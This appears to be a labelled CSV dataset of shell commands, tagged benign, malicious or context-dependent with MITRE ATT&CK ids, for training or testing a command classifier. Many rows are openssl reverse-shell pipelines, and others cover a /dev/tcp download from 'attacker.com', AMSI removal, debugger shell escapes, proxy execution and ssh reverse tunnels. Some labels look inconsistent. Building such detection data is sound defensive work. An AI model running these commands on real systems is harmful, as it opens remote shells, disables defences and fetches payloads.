command,label,original_label,mitre_id
openssl s_client -quiet -connect 10.10.10.50:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
marimo edit path/to/notebook.py,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:3389 user@172.16.5.20,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
autoload -Uz add-zsh-hook,Benign,Benign,Benign
ohdear get-monitor --monitor-id monitor_id,Benign,Benign,Benign
archlinux-java set java_environment,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
fmt -999 /path/to/input-file,Context_Dependent,Malicious,T1005
ghcid --height=height --width=width path/to/Main.hs,Benign,Benign,Benign
"Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse",Malicious,Malicious,T1562
ssh -R 4444:localhost:22 svcuser@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"find . -type f \( -name ""*.class"" -o -name ""*.sh"" \)",Benign,Benign,Benign
bc --expression '5 / 3',Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 postgres@192.168.1.1,Context_Dependent,Synthetic,Synthetic
ssh -L 9999:example.org:80 -N -T username@remote_host,Context_Dependent,Benign,Benign
git show-merged-branches,Benign,Benign,Benign
find . | grep -qi /path/to/something[^/]*$,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
n rm version,Benign,Benign,Benign
wait --help,Benign,Benign,Benign
chmod g+w $(ls -1a | grep -v '^..$'),Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
picom-trans [-c|--current] [-o|--opacity] percentage,Benign,Benign,Benign
bird -c path/to/bird.conf,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
mhwd [-li|--listinstalled],Benign,Benign,Benign
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file,Malicious,Malicious,T1059
ssh -L 8080:localhost:9090 backup@172.16.5.20,Context_Dependent,Synthetic,Synthetic
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",Malicious,Malicious,T1482
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
find . -name core -exec rm {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
linkchecker --ignore-url regex https://example.com/,Benign,Benign,Benign
zmv -v '(*).log' '$1.txt',Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
mongorestore --db database_name path/to/directory,Benign,Benign,Benign
"units ""meters / second"" ""inches / hour""",Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
New-Item $rclone_config_path\rclone -ItemType directory,Malicious,Malicious,T1567
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
"find / -name ""*.dbf"" -exec dirname {} \; 2> /dev/null | sort -u",Context_Dependent,Benign,Benign
mkfile -n sizeb|k|m|g path/to/file,Benign,Benign,Benign
frpc [-c|--config] path/to/frps.toml,Benign,Benign,Benign
mate [-w|--wait] path/to/file,Benign,Benign,Benign
zeroclaw cron list,Benign,Benign,Benign
"ia search 'subject:""subject"" collection:collection'",Benign,Benign,Benign
<Super v>,Benign,Benign,Benign
xzdiff --paginate path/to/file1 path/to/file2,Benign,Benign,Benign
transcode -J stabilize -i input_file,Benign,Benign,Benign
xwininfo -tree -root | grep keyword | head -1 | perl -ne 'print $1 if /(0x[\da-f]+)/ig;',Benign,Benign,Benign
ren %APPDATA%\amsi.dll ualapi.dll,Malicious,Malicious,T1574
"cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""$File_to_Encrypt_Location`""""",Malicious,Malicious,T1486
keybase encrypt [-i|--infile] input_file [-o|--outfile] output_file receiver,Benign,Benign,Benign
boxxy program,Benign,Benign,Benign
nix-collect-garbage,Benign,Benign,Benign
"whisper path/to/audio.mp3 --output_dir ""path/to/output""",Benign,Benign,Benign
fakedata --generators,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
mongoexport --collection=collection_name --jsonArray,Benign,Benign,Benign
ssh -R 4444:localhost:9090 postgres@staging.lab,Context_Dependent,Synthetic,Synthetic
adb reverse --remove tcp:remote_port,Benign,Benign,Benign
find /path/to/directory/* -maxdepth 0 -type d -exec basename {} \;,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
wat2wasm file.wat [-o|--output] file.wasm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
find . -atime +7 -print,Benign,Benign,Benign
pg_receivewal [-v|--verbose] [-h|--host] host [-p|--port] port [-U|--username] username [-D|--directory] directory,Benign,Benign,Benign
tzutil /s timezone_id,Benign,Benign,Benign
mysqlsh --user username --host hostname --port port,Benign,Benign,Benign
"systemd-notify --status ""Add custom status message here...""",Benign,Benign,Benign
go doc -all encoding/json,Benign,Benign,Benign
ldd /usr/bin/nginx,Benign,Synthetic,Synthetic
smem --system,Benign,Benign,Benign
"security set-identity-preference -s URL|hostname|service -c ""common_name"" path/to/file.keychain",Benign,Benign,Benign
HKCU\Software\Classes\http\shell\open\command,Context_Dependent,Malicious,T1012
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
chars U+1F63C,Benign,Benign,Benign
xfce4-screenshooter [-w|--window] [-c|--clipboard],Benign,Benign,Benign
find /tmp -name '*.swp' -exec rm {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
qcp *.jpg,Benign,Benign,Benign
ssh -R 4444:localhost:8888 postgres@support.internal,Context_Dependent,Synthetic,Synthetic
history | tail,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
find . -name modules,Benign,Benign,Benign
yarn --cwd .,Malicious,Malicious,T1059
sysctl [-a|--all],Context_Dependent,Benign,Benign
tracert /d IP,Benign,Benign,Benign
"tgutil [-n|--name] session_name [-u|--username] chat_id [-m|--mode] edit --text ""current_text"" --newtext ""new_text""",Benign,Benign,Benign
"InfDefaultInstall.exe ""$inf_to_execute""",Malicious,Malicious,T1218
busctl status service|pid,Benign,Benign,Benign
drupal-check [-a|--analysis] path/to/directory,Benign,Benign,Benign
sdelete -p 3 path\to\file1 path\to\file2 ...,Benign,Benign,Benign
/path/to/ld.so /bin/sh,Malicious,Malicious,T1059
opt -dot-cfg -S path/to/file.bc -disable-output,Benign,Benign,Benign
find /home/david -name 'index*',Context_Dependent,Benign,Benign
slurmrestd -a authentication_plugins [host]:port|unix:/path/to/socket,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
"cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",Malicious,Malicious,T1036
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
ascii -o,Benign,Benign,Benign
GetUserSPNs.py domain/username:password -dc-ip domain_controller_ip -request,Benign,Benign,Benign
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s $dll_name) ELSE ( $regsvr32path\$regsvr32name /s $dll_name )",Malicious,Malicious,T1218
nova start server,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
qpdf --empty --pages path/to/file1.pdf file2.pdf ... -- path/to/output.pdf,Benign,Benign,Benign
"Remove-Item -Recurse path\to\key1 , path\to\key2 ...",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
scala [-e|--execute-script] command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
pacini path/to/file --verbose,Benign,Benign,Benign
cat files.txt | xargs du -c | tail -1 | awk '{print $1}',Benign,Benign,Benign
Add-AppxPackage -Path path\to\package.msix,Benign,Benign,Benign
"kubectl set resources [deploy|deployment]/deployment_name --limits cpu=cpu_limit,memory=memory_limit",Benign,Benign,Benign
echo DATA >output-file,Malicious,Malicious,T1222
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
jc pattern,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
electrum signmessage address message,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
homeshick cd castle_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
gmssl version,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
flask run,Benign,Benign,Benign
"espeak ""text""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
gawk '{print $5}' path/to/file,Benign,Benign,Benign
find . -exec file {} \;,Benign,Benign,Benign
gdb -nx -ex '!/bin/sh' -ex quit,Malicious,Malicious,T1059
toolbox rm [-f|--force] container_name,Benign,Benign,Benign
/System/Library/LaunchAgents,Malicious,Malicious,T1543
ssh -R 8080:localhost:80 backup@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
engrampa --extract-to=path/to/directory path/to/archive1.tar path/to/archive2.tar ...,Benign,Benign,Benign
"Stop-Service -DisplayName ""name""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
laravel-zero new name,Benign,Benign,Benign
"bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'",Malicious,Malicious,T1105
multipass info instance_name,Benign,Benign,Benign
oniux bash,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
pulumi org,Benign,Benign,Benign
pbmtoescp2 [-re|-resolution] 180|360|720 path/to/image.pbm > path/to/output.escp2,Benign,Benign,Benign
tspin path/to/file.log [-p|--print],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
"echo ""error"" | tee",Benign,Benign,Benign
opencode models [-h|--help],Benign,Benign,Benign
"cd ""$(dirname ""$(which oracle)"")""",Benign,Benign,Benign
find . -name \*.c -exec grep wait_event_interruptible {} /dev/null \;,Benign,Benign,Benign
/.local/share/keyrings,Malicious,Malicious,T1555
ansible-lint path/to/playbook_file path/to/role_directory,Benign,Benign,Benign
sudo kernelstub [-c|--dry-run],Benign,Benign,Benign
gcloud auth activate-service-account,Benign,Benign,Benign
CreateIoCompletionPort(),Malicious,Malicious,T1486
vim /opt/app/Dockerfile,Benign,Synthetic,Synthetic
cs fetch --dependency-file path/to/file1 --dependency-file path/to/file2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
ls -tQ | tail -n+4 | xargs rm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
swaymsg [-t|--type] get_outputs,Benign,Benign,Benign
"oxipng ""*.png""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 postgres@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
vim /var/log/package.json,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:995,Malicious,Synthetic,Synthetic
"cmstp /s ""path\to\profile_file""",Benign,Benign,Benign
brew [up|update],Benign,Benign,Benign
"find ""$sourceDir"" -type d | sed -e ""s?$sourceDir?$targetDir?"" | xargs mkdir -p",Benign,Benign,Benign
a2ping --nocompress none|zip|best|flate path/to/file,Benign,Benign,Benign
sudo setfiles /etc/selinux/targeted/contexts/files/file_contexts path/to/directory [-n|--nochange],Benign,Benign,Benign
createrepo [-S|--skip-symlinks] [-s|--checksum] sha1 path/to/directory,Benign,Benign,Benign
rustscan [-b|--batch-size] batch_size [-t|--timeout] timeout [-a|--addresses] address_or_addresses,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
navi fn welcome,Benign,Benign,Benign
dolphin --split path/to/directory1 path/to/directory2,Benign,Benign,Benign
mount | tail -1 | sed 's/ on .* ([^)]*)$//',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
ac -dp username,Benign,Benign,Benign
optipng path/to/file.png,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:5432 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:995 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
gcpdiag lint --project gcp_project_id --hide-ok,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 operator@172.16.0.10,Context_Dependent,Synthetic,Synthetic
split -d -l $SPLITLIMT $INFILE x_,Benign,Benign,Benign
nix-env [-qaP|--query --available --attr-path] search_term_regex,Benign,Benign,Benign
ssh -R 8080:localhost:9001 backup@malware.site,Context_Dependent,Synthetic,Synthetic
nix flake init,Benign,Benign,Benign
numlockx off,Benign,Benign,Benign
ssh -R 8080:localhost:80 support@internal.corp,Context_Dependent,Synthetic,Synthetic
palmtopnm [-t|-transparent] path/to/file.palm,Benign,Benign,Benign
ssh -R 4444:localhost:443 deploy@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
find . -type f -exec grep -Iq . {} \; -and -print,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
mmls -t nested_table_type -o offset path/to/image_file,Benign,Benign,Benign
ar t path/to/file.ar,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
